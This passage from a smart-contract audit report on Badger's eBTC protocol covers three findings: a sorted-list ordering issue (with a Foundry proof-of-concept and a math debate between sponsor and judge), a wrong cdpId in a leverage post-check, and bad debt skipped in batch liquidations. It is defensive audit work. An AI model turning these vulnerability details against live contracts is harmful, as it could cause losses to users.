The `_feeTaken` goes directly to the protocol and reduces the `totalCollateral` value. (because internal accounting uses shares for internal accounting aka wstETH) [CdpManagerStorage.sol#L585](https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/CdpManagerStorage.sol#L585):

```solidity
activePool.allocateSystemCollSharesToFeeRecipient(_feeTaken);
```

Because the stake is calculated like this: [CdpManagerStorage.sol#L454](https://github.com/code-423n4/2023-10-badger/blob/f2f2e2cf9965a1020661d179af46cb49e993cb7e/packages/contracts/contracts/CdpManagerStorage.sol#L454)

```solidity
stake = (_coll * totalStakesSnapshot) / totalCollateralSnapshot;
```

Now the new CDP stake will be higher than old cdp stakes since `totalStakesSnapshot` has not moved but `totalCollateralSnapshot` has decreased.

⇒ Since the debt redistributions and fee payments depend on the stake to distribute funds, we can intuitively understand that new CDPs will pay more fees than the old ones. Therefore, new cpds NICR (Nominal Individual Collateral Ratio = shares/debt) will decrease at a higher rate than old ones.

This can cause old CDPs to cross newer ones and break list order.

This list order break make the insertion position not unique anymore, this can lead to more and more disorder in the list that leads to unexpected behaviours such as DOS and bad redemption order.

### Proof of Concept

This poc only takes advantage of splitting fees to break the list order, but note that debt redistribution events exacerbate this problem.

<details>

```solidity
function test_H1() public {
  vm.pauseGasMetering();

  address firstUser;
  address lastUser;
  bytes32 firstCdpId;
  bytes32 lastCdpId;       

  uint loop = 100;

  /// let's open 100 cdps and save the 1st and last index
  for (uint256 i = 0; i < loop; i++) {
      (uint256 oldIndex, uint256 newIndex) = _applyIndexChange(2000000000000000); // 0,2% stETH increase
      // get a random user
      address user = _utils.getNextUserAddress();
      vm.startPrank(user);

      // Randomize collateral amount used
      vm.deal(user, 10 ether * 1000);
      collateral.approve(address(borrowerOperations), 10 ether*1000);
      collateral.deposit{value: 10 ether * 1000}();

      uint shareAmount = 10 ether;
      uint256 collAmount = collateral.getPooledEthByShares(shareAmount);

      uint256 borrowedAmount;
      if (i == loop - 1)
          // here we compute borrowedAmount to make lastCdpId NCIR very close to firstCdpId NICR
          borrowedAmount = (1e20 * (shareAmount - collateral.getSharesByPooledEth(2e17))) / cdpManager.getSyncedNominalICR(firstCdpId);   // borrowedAmount = 0.65764 ether;
      else
          borrowedAmount = 0.5 ether;

      bytes32 id = borrowerOperations.openCdp(borrowedAmount, "hint", "hint", collAmount);

      if (i == 0)        {firstUser = user; firstCdpId = id;}
      if (i == loop - 1) {lastUser = user ; lastCdpId = id;}

      vm.stopPrank();
  }

  logNICR(firstCdpId, lastCdpId);
  // NICR 1st trove should be < NICR last trove 
  assertLe(cdpManager.getSyncedNominalICR(firstCdpId), cdpManager.getSyncedNominalICR(lastCdpId));

  /// Let's increase the stETH by 40% and open a last cdp
  (uint256 oldIndex, uint256 newIndex) = _applyIndexChange(400000000000000000); // 40% stETH increase
  // get a random user
  address user = _utils.getNextUserAddress();
  vm.startPrank(user);

  uint256 collAmount = 10 ether;
  // deal ETH and deposit for collateral
  vm.deal(user, collAmount * 1000);
  collateral.approve(address(borrowerOperations), collAmount);
  collateral.deposit{value: collAmount * 1000}();

  uint borrowedAmount = 0.5 ether;
  borrowerOperations.openCdp(borrowedAmount, "hint", "hint", collAmount);
  vm.stopPrank();
  
  logNICR(firstCdpId, lastCdpId);
  // NICR 1st trove should be < NICR last cdp but it's not the case 
  assertLe(cdpManager.getSyncedNominalICR(firstCdpId), cdpManager.getSyncedNominalICR(lastCdpId));
}

function logNICR(bytes32 firstCdpId, bytes32 lastCdpId) public {
  console.log("---------------------------------- 1st cdp");
  console.log("getCdpStake         : ", cdpManager.getCdpStake(firstCdpId));
  console.log("getCdpCollShares    : ", cdpManager.getCdpCollShares(firstCdpId));
  console.log("getSyncedNominalICR : ", cdpManager.getSyncedNominalICR(firstCdpId));
  console.log("---------------------------------- last cdp");
  console.log("getCdpStake         : ", cdpManager.getCdpStake(lastCdpId));  
  console.log("getCdpCollShares    : ", cdpManager.getCdpCollShares(lastCdpId));
  console.log("getSyncedNominalICR : ", cdpManager.getSyncedNominalICR(lastCdpId));
  console.log("---");
  console.logInt(int(int(cdpManager.getSyncedNominalICR(firstCdpId))-int(cdpManager.getSyncedNominalICR(lastCdpId))));
  console.log("----------------------------------");
}
```

</details>

This test fails on the last assertion, meaning that the list is no longer sorted.

### Recommended Mitigation Steps

This is hard to fix because the sorted list was not designed to work this way.

I haven't been able to find a quick fix that preserves the list order with a fair redistribution.

Even if it is less fair for borrowers, a proportional distribution (without the corrected stake) can solve this problem but it will be an incomplete solution.

The eBTC team needs to rethink the fee/debt redistribution to maintain the list order.

### Sources

<https://github.com/liquity/dev/blob/main/papers/Efficient_Order-Preserving_Redistribution_of_Troves.pdf>

**[Alex the Entreprenerd (Badger) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/155#issuecomment-1827750840):**
 > The conclusion is wrong.
> 
> But the finding showed that the feeSplit math is incorrect, which is a severe finding.

**[rayeaster (Badger) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/155#issuecomment-1831082736):**
 > It is more like a precision issue using Solidity (sth like $\frac{(x -z) + (z - y)}{c} \neq \frac{x - z}{c} + \frac{z - y}{c}$) instead of a fundamental design problem. 
> 
> The following statement is worth more thinking:
> `we can intuitively understand that new CDPs will pay more fees than the old ones. Therefore, new cpds NICR (Nominal Individual Collateral Ratio = shares/debt) will decrease at a higher rate than old ones.`
> 
> Yes, **higher stake** leads to **more fees**, but it is NOT equal to **"decrease at a higher rate"**, actually the **relative** ratio of NICR between two CDPs always keep the **same** "theoretically" by the stake mechanism:
> 
> - Suppose `totalStakeSnapshot` is $S_{n}$ which is not changed by split fee claim
> - At time `T0`, `totalCollateralSnapshot` is $C_{n0}$ 
> - At time `T1`, a $CDP_{1}$ is created with initial collateral share `c` and debt `d` thus its stake is $s_{1}=\frac{c * S_{n}}{C_{n0}}$
> - At time `T2`, a split fee claim happens and `totalCollateralSnapshot` is changed to $C_{n1}$, **note that** $C_{n1} < C_{n0}$ and $C_{n0} - C_{n1} = S_{n} * \Delta{P_{1}}$ where $\Delta{P_{1}}$ is the delta change of fee per stake unit
> - At time `T3`, another $CDP_{2}$ is created with the same collateral share `c` and debt `d` but now its stake is $s_{2}=\frac{C * S_n}{C_{n1}} > s_{1}$
> - Now `NICR` of $CDP_{1}$ is $\frac{c - s_{1} * \Delta{P_{1}}}{d}$ and `NICR` of $CDP_{2}$ is $\frac{c}{d} > NICR_{1}$, their `NICR` ratio $r_{1}$ is $\frac{c - s_{1} * \Delta{P_{1}}}{c}$
> - At time `T4` (maybe after a long time), a split fee claim happens again and $\Delta{P_{2}}$ is the delta change of fee per stake unit for this time
> - Now `NICR` of $CDP_{1}$ is $\frac{c - s_{1} * \Delta{P_{1}} - s_{1} * \Delta{P_{2}}}{d}$ and `NICR` of $CDP_{2}$ is $\frac{c - s_{2} * \Delta{P_{2}}}{d}$, so their `NICR` ratio $r_{2}$ is now $\frac{c - s_{1} * \Delta{P_{1}} - s_{1} * \Delta{P_{2}}}{c - s_{2} * \Delta{P_{2}}}$
> - Let us prove that $r_{2}=r_{1}$ in theory
> 
> If $\frac{c - s_{1} * \Delta{P_{1}} - s_{1} * \Delta{P_{2}}}{c - s_{2} * \Delta{P_{2}}} = \frac{c - s_{1} * \Delta{P_{1}}}{c} \Rightarrow $ 
> 
> $(c - s_{1} * \Delta{P_{1}}) * (c - s_{2} * \Delta{P_{2}}) = c * (c - s_{1} * \Delta{P_{1}} - s_{1} * \Delta{P_{2}}) \Rightarrow $
> 
> $c^2 - c * s_{2} * \Delta{P_{2}} - c * s_{1} * \Delta{P_{1}} + s_{1} * s_{2} * \Delta{P_{1}} * \Delta{P_{2}} = c^2 - c * s_{1} * \Delta{P_{1}} - c * s_{1} * \Delta{P_{2}} \Rightarrow $
> 
> $s_{1} * s_{2} * \Delta{P_{1}} = c * (s_{2} - s_{1}) \Rightarrow \frac{s_{1}}{c} * \Delta{P_{1}} = 1 - \frac{s_{1}}{s_{2}} \Rightarrow$
> 
> $\frac{S_{n}}{C_{n0}} * \Delta{P_{1}} = 1 - \frac{C_{n1}}{C_{n0}} \Rightarrow S_{n} * \Delta{P_{1}} = C_{n0} - C_{n1} $ 
> 
> Proved
> 
> If we could manually `syncAccounting` for the first CDP along the poc test path (i.e., always sync its collateral for every index increase in the loop) or **simply** set the loop number to 1000 instead of 100, the list order will not break at the end of the poc test. 
> 
> And the break require some delicate conditions like significant increase of the Lido stETH index, e.g., 40% increase means about 10 years at the current staking reward apr.
> 
> I suggest to mark it as "acknowledged".

**[ronnyx2017 (Judge) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/155#issuecomment-1833645852):**
 > Thanks for the careful and clear math prove from @rayeaster, it's very helpful to show the underlying mechanism of the issue based. It's amazing. And I want to add a comment for s2 in T3. There is no need to worry about the impact of c and s1 on Sn and Cn1 in T1, as they grow proportionally. The mathematical calculations in T3 are completely correct, and you can further prove this. I have actually done it myself, but I'm not very good at writing mathematical formulas using Markdown. So, I'm only providing this conclusion to prevent any doubts about this.
> 
> And I add one line at the end of logNICR function in  the original poc:
> ```solidity
> console.log(cdpManager.getSyncedNominalICR(firstCdpId) * 1e18 / cdpManager.getSyncedNominalICR(lastCdpId));
> ```
> The console log can clearly show why the sponsor says it's a precision issue:
> ```
> Logs:
> before
>   ---------------------------------- 1st cdp
>   getCdpStake         :  9800399201596806387
>   getCdpCollShares    :  9800399201596806387
>   getSyncedNominalICR :  1791162047648499053200
>   ---------------------------------- last cdp
>   getCdpStake         :  10760678217311938700
>   getCdpCollShares    :  9833333333333333333
>   getSyncedNominalICR :  1791162047648499053418
>   ---
>   -218
>   999999999999999999
>   ----------------------------------
>  after
>   ---------------------------------- current cdp
>   getCdpStake         :  7660143815713583482
>   getCdpCollShares    :  6125000000000000000
>   getSyncedNominalICR :  1225000000000000000000
>   ----------------------------------
>   ---------------------------------- 1st cdp
>   getCdpStake         :  9800399201596806387
>   getCdpCollShares    :  9800399201596806387
>   getSyncedNominalICR :  1567266791692436672600
>   ---------------------------------- last cdp
>   getCdpStake         :  10760678217311938700
>   getCdpCollShares    :  9833333333333333333
>   getSyncedNominalICR :  1567266791692436672219
>   ---
>   381
>   1000000000000000000
>   ----------------------------------
> ```
> In fact, this variation is not linear. It requires the growth of the index to occur at an extremely precise value in order to generate this error.
> 
> And I also want to provide a poc test for the amazing math prove from @rayeaster, thanks again.
> ```solidity
>       function test_H2prove() public {
>         vm.pauseGasMetering();
>       
>         address cdp1_user;
>         address cdp2_user;
>         bytes32 cdp1_id;
>         bytes32 cdp2_id;       
> 
>         // stake someting to init
>         {
>             address _nobody = prepareUser();
>             vm.prank(_nobody);
>             borrowerOperations.openCdp(1.337 ether, "hint", "hint", 31.415 ether);
>             _applyIndexChange(1000000000000000); // +0.1% index
>         }
>         
>         // T0
>         {
>             cdpManager.syncGlobalAccountingAndGracePeriod();
>             uint Sn = cdpManager.totalStakesSnapshot();
>             uint Cn0 = cdpManager.totalCollateralSnapshot();
>             console.log(Sn, Cn0);    
>         }
>         
>         // const
>         uint c = 10 ether;
>         uint d = 0.5 ether;
> 
>         // T1
>         cdp1_user = prepareUser();
>         vm.prank(cdp1_user);
>         cdp1_id = borrowerOperations.openCdp(d, "hint", "hint", c);
>         // uint s1 = cdpManager.getCdpCollShares(cdp1_id);
>         // console.log(s1);
> 
>         // T2
>         {
>             int delta_p1 = 2000000000000000; // +0.2% index
>             _applyIndexChange(delta_p1);
>             cdpManager.syncGlobalAccountingAndGracePeriod();
>             // vm.prank(cdp1_user);
>             // cdpManager.syncAccounting(cdp1_id);
>         }
> 
>         // T3
>         cdp2_user = prepareUser();
>         vm.prank(cdp2_user);
>         // c = 17 ether;
>         // d = 1.1 ether;
>         cdp2_id = borrowerOperations.openCdp(d, "hint", "hint", c);
>         // uint s2 = cdpManager.getCdpCollShares(cdp2_id);
>         // console.log(s2);
> 
>         // after T3, we should calc NICR rate
>         uint wad = 1e18;
>         {
>             uint cdp1_NICR_T3 = cdpManager.getSyncedNominalICR(cdp1_id);
>             uint cdp2_NICR_T3 = cdpManager.getSyncedNominalICR(cdp2_id);
>             uint rate_T3 = cdp1_NICR_T3 * wad / cdp2_NICR_T3;
>             console.log(rate_T3);
>         }
> 
>         // T4
>         {
>             int delta_p2 = 400000000000000000; // +40% index
>             _applyIndexChange(delta_p2);
>             cdpManager.syncGlobalAccountingAndGracePeriod();
>             // dump rate after T4
>             uint cdp1_NICR_T4 = cdpManager.getSyncedNominalICR(cdp1_id);
>             uint cdp2_NICR_T4 = cdpManager.getSyncedNominalICR(cdp2_id);
>             uint rate_T4 = cdp1_NICR_T4 * wad / cdp2_NICR_T4;
>             console.log(rate_T4);
>             // console.log(cdpManager.getCdpCollShares(cdp1_id), cdpManager.getCdpCollShares(cdp2_id));
>         }
>       }
> ```

**[rayeaster (Badger) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/155#issuecomment-1833756837):**
 > @ronnyx2017 - Thanks for the great proof test!
> 
> It helps to spark an interesting idea. Do you think it would help to use sth like `cdpManager.getSyncedNominalICR(firstCdpId) * 1e18 / cdpManager.getSyncedNominalICR(lastCdpId)` to compare the NICR as an additional check?
> 
> I mean we could say $NICR_{1}$ is larger than $NICR_{2}$ **only if** the following two conditions are satisfied **at the same time**:
> - $NICR_{1} > NICR_{2}$
> - $\frac{NICR_{1} * 1e18}{NICR_{2}} > 1e18$

**[ronnyx2017 (Judge) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/155#issuecomment-1833965334):**
 > Aha, I think this check may be idealistic. The poc we are currently discussing only involves a single rounding situation, but the actual scenario may be much more complex. Each syncAccounting after a rebase introduces rounding, but I believe this will actually alleviate the impact of the issue.

**[rayeaster (Badger) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/155#issuecomment-1835315439):**
 > If we add bad debt redistribution into the play, the ratio of NICR between CDPs would change but will **NOT** go to the extent that reverse the ordering, theoretically:
> 
> - Following above [math derivation setup](https://github.com/code-423n4/2023-10-badger-findings/issues/155#issuecomment-1831082736), suppose right after $CDP_{2}$ is created at time T3, there is a liquidation with some bad debt to be redistributed and introduce a $\Delta{d_{1}}$ increase for `systemDebtRedistributionIndex`
> - Now the `NICR` of $CDP_{1}$ is $\frac{c - s_{1} * \Delta{P_{1}}}{d + s_{1} * \Delta{d_{1}}}$, and `NICR` of $CDP_{2}$ is $\frac{c}{d + s_{2} * \Delta{d_{1}}}$, let us prove that their NICR ratio  still keep the ordering:
> 
> $ratio_{NICR} = \frac{c - s_{1} * \Delta{P_{1}}}{c} * \frac{d + s_{2} * \Delta{d_{1}}}{d + s_{1} * \Delta{d_{1}}} = \frac{s_{1}}{s_{2}} * \frac{d + s_{2} * \Delta{d_{1}}}{d + s_{1} * \Delta{d_{1}}} = \frac{s_{1} * s_{2} * \Delta{d_{1}} + s_{1} * d}{s_{1} * s_{2} * \Delta{d_{1}} + s_{2} * d} \lt 1$ 
> 
> Proved
> 
> So the whole story would be: 
> - Split fee distribution would keep the NICR ratio the **same**
> - Bad debt redistribution would change the NICR ratio a bit but still **remain the ordering**

**[ronnyx2017 (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/155#issuecomment-1839732287):**
 > The impact based on bad debt redistribution is valid, but it can't break the cdp order. Considering the fixes already introduced in Liquity, I suggest considering the impact of this issue in long-running systems. Therefore, I mark this issue as medium. 

***

## [[M-05] When calling LeverageMacroBase.doOperation to open a CDP, the POST CALL CHECK may use the wrong cdpId](https://github.com/code-423n4/2023-10-badger-findings/issues/152)
*Submitted by [nobody2018](https://github.com/code-423n4/2023-10-badger-findings/issues/152), also found by [Stormy](https://github.com/code-423n4/2023-10-badger-findings/issues/320), [0xRobocop](https://github.com/code-423n4/2023-10-badger-findings/issues/204), and [BARW](https://github.com/code-423n4/2023-10-badger-findings/issues/181)*

After [LeverageMacroBase.doOperation](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L118-L124) is used to open a new CDP, there will be a [POST CALL CHECK](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L169-L183), which is used to check the new CDP. However, the current implementation incorrectly assumes that [the index of the new CDP is the last one](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L173). In this case, there may be two impacts:

1.  The check that should be passed cannot be passed, causing tx revert and waste of gas.
2.  The check that should not have been passed was passed, which may result in funds losses from `this` contract or caller.

### Proof of Concept

`doOperation` is used to open a new CDP, and there are roughly three steps: setup for POST CALL CHECK, openCdp, POST CALL CHECK for the created CDP.

```solidity
File: packages\contracts\contracts\LeverageMacroBase.sol
118:     function doOperation(
119:         FlashLoanType flType,
120:         uint256 borrowAmount,
121:         LeverageMacroOperation calldata operation,
122:         PostOperationCheck postCheckType,
123:         PostCheckParams calldata checkParams
124:     ) external {
......
139:         uint256 initialCdpIndex;
140:         if (postCheckType == PostOperationCheck.openCdp) {
141:             // How to get owner
142:             // sortedCdps.existCdpOwners(_cdpId);
143:->           initialCdpIndex = sortedCdps.cdpCountOf(address(this));
144:         }

......//do the operation

169:         if (postCheckType == PostOperationCheck.openCdp) {
170:             // How to get owner
171:             // sortedCdps.existCdpOwners(_cdpId);
172:             // initialCdpIndex is initialCdpIndex + 1
173:->           bytes32 cdpId = sortedCdps.cdpOfOwnerByIndex(address(this), initialCdpIndex);.
174: 
175:             // Check for param details
176:             ICdpManagerData.Cdp memory cdpInfo = cdpManager.Cdps(cdpId);
177:->           _doCheckValueType(checkParams.expectedDebt, cdpInfo.debt);
178:->           _doCheckValueType(checkParams.expectedCollateral, cdpInfo.coll);
179:             require(
180:                 cdpInfo.status == checkParams.expectedStatus,
181:                 "!LeverageMacroReference: openCDP status check"
182:             );
183:         }
......
211:     }
```

L143, `initialCdpIndex = sortedCdps.cdpCountOf(address(this))`, which [is used to count the number of CDPs](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L216-L219) already owned by `this`.

L145-168, Creats a CDP, the code here is not helpful in describing the issue and is therefore omitted.

L173, `sortedCdps.cdpOfOwnerByIndex(address(this), initialCdpIndex)` is used to get the id of the initialCdpIndex-th CDP owned by `this`. That's the problem. Because `initialCdpIndex` is the number of CDPs owned before the new CDP was created (from L143), that is to say, the index of the created CDP is considered to be the last one.

Let's look at the code of `cdpOfOwnerByIndex`:

```solidity
File: packages\contracts\contracts\SortedCdps.sol
140:     function cdpOfOwnerByIndex(
141:         address owner,
142:         uint256 index
143:     ) external view override returns (bytes32) {
144:->       (bytes32 _cdpId, ) = _cdpOfOwnerByIndex(owner, index, dummyId, 0);
145:         return _cdpId;
146:     }
......
173:     function _cdpOfOwnerByIndex(
174:         address owner,
175:         uint256 index,
176:         bytes32 startNodeId,
177:         uint maxNodes
178:     ) internal view returns (bytes32, bool) {
179:         // walk the list, until we get to the indexed CDP
180:         // start at the given node or from the tail of list
181:->       bytes32 _currentCdpId = (startNodeId == dummyId ? data.tail : startNodeId);
182:->       uint _currentIndex = 0;
183:         uint i;
184: 
185:         while (_currentCdpId != dummyId) {
186:             // if the current CDP is owned by specified owner
187:             if (getOwnerAddress(_currentCdpId) == owner) {
188:                 // if the current index of the owner CDP matches specified index
189:->               if (_currentIndex == index) {
190:->                   return (_currentCdpId, true);
191:                 } else {
192:                     // if not, increment the owner index as we've seen a CDP owned by them
193:->                   _currentIndex = _currentIndex + 1;
194:                 }
195:             }
196:             ++i;
197: 
198:             // move to the next CDP in the list
199:             _currentCdpId = data.nodes[_currentCdpId].prevId;
200: 
201:             // cut the run if we exceed expected iterations through the loop
202:             if (maxNodes > 0 && i >= maxNodes) {
203:                 break;
204:             }
205:         }
206:         // if we reach maximum iteration or end of list
207:         // without seeing the specified index for the owner
208:         // then maybe a new pagination is needed
209:         return (_currentCdpId, false);
210:     }
```

L144, `_cdpOfOwnerByIndex(owner, index, dummyId, 0)` is called.

L181, \_currentCdpId = data.tail due to `startNodeId = dummyId`.

L189-194, If `_currentIndex == index`, the target `cdpId` is found and the loop exits. Otherwise, `_currentIndex` is increased by 1.

To better describe the problem, consider the following scenario:

`this` already has 1 CDP: A, and the entire linked list currently has 10 CDPs. Its topology is as follows:

```flow
head                      tail  
cdp1->A->cdp2->...->cdp8->cdp9
```

New CDP is created via `doOperation`:

1.  `initialCdpIndex = 1`, which is from `sortedCdps.cdpCountOf(address(this))`.

2.  open a new Cdp: B.

3.  The current linked list has 11 CDPs, and its topology is as follows:

    ```flow
    head                         tail  
    cdp1->A->cdp2->cdp3->B->...->cdp9
    ```

4.  `cdpId = sortedCdps.cdpOfOwnerByIndex(address(this), 1)`. **`cdpId` was expected to be B's id, but A's id was returned**.

The root cause of this case is that the linked list is in descending order of NICR, and **the NICR of the newly created CDP may be lower than the NICR of the already created CDP**. In this case, the wrong `cdpId` will be returned.

### Recommended Mitigation Steps

In [\_openCdpCallback](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L465), `borrowerOperations.openCdp` returns the created `cdpId`, and we should specify a slot to store this value. Afterwards, read this slot directly in POST CALL CHECK and reset it to `byte32(0)`. The slot can be obtained by using a method similar to `keccak256("Badger.LeverageMacroBase.OpenCdpId")`.

**[Alex the Entreprenerd (Badger) confirmed and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/152#issuecomment-1818569092):**
 > Would have liked a coded POC of 2 cdps and the last one not being last.
> 
> Team says that to find the specific CdpID we would need to use something like this:
>  
> `cdpID = sorted.Cdps.toCdpID(msg.sender, block.number, sortedCdps.nextCdpNonce());`
> 
> The finding seems valid, but I believe it would result in reverts on usage (no loss of funds).<br>
> And I believe it was missed because the check always works for the first Cdp, it will cause issue for the 2nd cdp onwards.

***

## [[M-06] Batched liquidations doesn't distribute bad debt on next batches in the list ](https://github.com/code-423n4/2023-10-badger-findings/issues/36)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-10-badger-findings/issues/36), also found by [Stormy](https://github.com/code-423n4/2023-10-badger-findings/issues/301) and [Nyx](https://github.com/code-423n4/2023-10-badger-findings/issues/195)*

LiquidationLibrary.batchLiquidateCdps is called from `CDPManager` in order to liquidate list of cdps.
Depending if system is currently in recovery mode liquidations will be done [inside `_getTotalFromBatchLiquidate_RecoveryMode` or `_getTotalsFromBatchLiquidate_NormalMode` function](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L698-L708).

After that `_finalizeLiquidation` function [will be called](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L717C9-L726), which will then do several important system updates, token transfer and what is important for this report [bad debt redistribution](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L525-L527). In case if new bad debt occurs in the system, then this [debt amount is redistributed to all stakers that are still in the system](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L862-L892).

Now, let's check how liquidations occur by `_getTotalsFromBatchLiquidate_NormalMode` function.
This function loops through all cpds one by one. It [fetches `ICR` for them](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L820) using `getSyncedICR` function. This function will calculate `ICR` not on stored `debt` and `coll` of cdp, but it will update this values, according to new fee rate(which means that `coll` will be reduced) and redistribute rate(which means that debt will increase, if rate is bigger than stored for cdp).

This is how it will be done for redistribution. <br><https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L864-L868>

```solidity
    function getSyncedICR(bytes32 _cdpId, uint256 _price) public view returns (uint256) {
        uint256 _debt = getSyncedCdpDebt(_cdpId);
        uint256 _collShare = getSyncedCdpCollShares(_cdpId);
        return _calculateCR(_collShare, _debt, _price);
    }
```

Then `getSyncedCdpDebt` is called, which calls `_getSyncedCdpDebtAndRedistribution` function. <br><https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L822-L833>

```solidity
    function _getSyncedCdpDebtAndRedistribution(
        bytes32 _cdpId
    ) internal view returns (uint256, uint256, uint256) {
        (uint256 pendingDebtRedistributed, uint256 _debtIndexDelta) = _getPendingRedistributedDebt(
            _cdpId
        );
        uint256 _newDebt = Cdps[_cdpId].debt;
        if (pendingDebtRedistributed > 0) {
            _newDebt = _newDebt + pendingDebtRedistributed;
        }
        return (_newDebt, pendingDebtRedistributed, _debtIndexDelta);
    }
```

So debt of cdp will be increased `pendingDebtRedistributed`, which depends on [redistribution rate of position and current redistribution rate](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L313).

Later, for each cdp `_getLiquidationValuesNormalMode` function [will be called](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L824), which will actually do the liquidation. It will [call `_liquidateIndividualCdpSetupCDPInNormalMode` function](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L630-L632). Inside of it [`_calculateFullLiquidationSurplusAndCap` function is called](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L251-L260) and it's purpose is to calculate shares that liquidator and cdp owner should receive and bad debt to redistribute.

So after liquidation has finished, then [`_addLiquidationValuesToTotals` function is called](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L827), which will add values from previous liquidation(including redistribution debt) [to the total accumulator](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L851-L853).

So finally, I can explain the problem. In case if in batch there is cdp, that will create bad debt after liquidation, then this debt will not be redistributed to all next liquidations, as redistribution index is not updated after each liquidation. And as result, next liquidations will have incorrect `debt` value, which means that smaller amount of debt will be liquidated and bigger amount of `coll` will be received by cdp owner. And also all else users in the system will have to cover that delta debt that was not redistributed to next liquidations.

### Impact

Bad debt is distributed incorrectly.

### Tools Used

VsCode

### Recommended Mitigation Steps

You need to redistribute bad debt after each liquidation in the batch (in case if bad debt occured).

**[Alex the Entreprenerd (Badger) acknowledged and commented](https://github.com/code-423n4/2023-10-badger-findings/issues/36#issuecomment-1818533285):**
 > This is a known finding from Cantina that unfortunately was not added to the report.
> 
> The finding specifically means that 3% of bad debt generated in a batch liquidation will be skipped, effectively making liquidations more favourable.
> 
> That said, it's worth noting that since partial liquidations don't cause a redistribution, the 3% bad debt could have been skipped under other circumstances.
> 
> https://github.com/GalloDaSballo/Cdp-Demo/blob/main/scripts/insolvency_cascade.py
> 
> <details>
> 
> ```python
> 
> MAX_BPS = 10_000
> 
> def cr(debt, coll):
>     return coll / debt * 100
> 
> def getDebtByCr(coll, cr_bps):
>    return coll / cr_bps * MAX_BPS
> 
> LICR = 103_00
> 
> 
> def max(a, b):
>    if(a > b):
>       return a
>    return b
> 
> def min(a, b):
>    if(a > b):
>       return b
>    return a
> 
> def full_liq(COLL):
>   ## burn all
>   return [COLL, COLL / LICR * MAX_BPS]
> 
> def partial_liq(COLL, percent):
>    return [COLL * percent / 100, COLL * percent / 100 / LICR * MAX_BPS]
> 
> def loop_full(cr_bps):
>   COLL = 100
>   DEBT = getDebtByCr(COLL, cr_bps)
>   print("DEBT", DEBT)
>   print("cr", cr(DEBT, COLL))
> 
>   ## Liquidate Partially based on premium
>   while(COLL > 2):
>      [sub_coll, sub_debt] = partial_liq(COLL, 10)
>     #  [sub_coll, sub_debt] = full_liq(COLL)
>      print("DEBT", DEBT)
>      print("COLL", COLL)
>      DEBT -= sub_debt
>      COLL -= sub_coll
>   
>   print("DEBT", DEBT)
>      
> 
> 
> 
> CRS = [
>    100_00,
>    90_00,
>    80_00,
>    70_00
> ]
> 
> def main():
>    print("Simulate Total Liquidation with Bad debt")
>    print("Coll is always 100")
>    print("No price means 1 coll = 1 debt for price")
>    for cr in CRS:
>     print("")
>     print("")
>     print("")
>     loop_full(cr)
>   
> 
>    
> 
> 
> 
> main()
> 
> ```
> </details>
> 

**[ronnyx2017 (Judge) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/36#issuecomment-1827401911):**
 > I didn't find a public record about the issue. So I'll mark it as Medium severity.

***

# Low Risk and Non-Critical Issues

For this audit, 26 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-10-badger-findings/issues/67) by **SpicyMeatball** received the top score from the judge.

*The following wardens also submitted reports: [ge6a](https://github.com/code-423n4/2023-10-badger-findings/issues/325), [prapandey031](https://github.com/code-423n4/2023-10-badger-findings/issues/324), [ladboy233](https://github.com/code-423n4/2023-10-badger-findings/issues/293), [ether\_sky](https://github.com/code-423n4/2023-10-badger-findings/issues/275), [peanuts](https://github.com/code-423n4/2023-10-badger-findings/issues/234), [LokiThe5th](https://github.com/code-423n4/2023-10-badger-findings/issues/226), [OMEN](https://github.com/code-423n4/2023-10-badger-findings/issues/197), [jasonxiale](https://github.com/code-423n4/2023-10-badger-findings/issues/192), [TrungOre](https://github.com/code-423n4/2023-10-badger-findings/issues/175), [0xBeirao](https://github.com/code-423n4/2023-10-badger-findings/issues/159), [nobody2018](https://github.com/code-423n4/2023-10-badger-findings/issues/151), [shaka](https://github.com/code-423n4/2023-10-badger-findings/issues/147), [wangxx2026](https://github.com/code-423n4/2023-10-badger-findings/issues/112), [alpha](https://github.com/code-423n4/2023-10-badger-findings/issues/107), [lsaudit](https://github.com/code-423n4/2023-10-badger-findings/issues/95), [hunter\_w3b](https://github.com/code-423n4/2023-10-badger-findings/issues/326), [nonseodion](https://github.com/code-423n4/2023-10-badger-findings/issues/304), 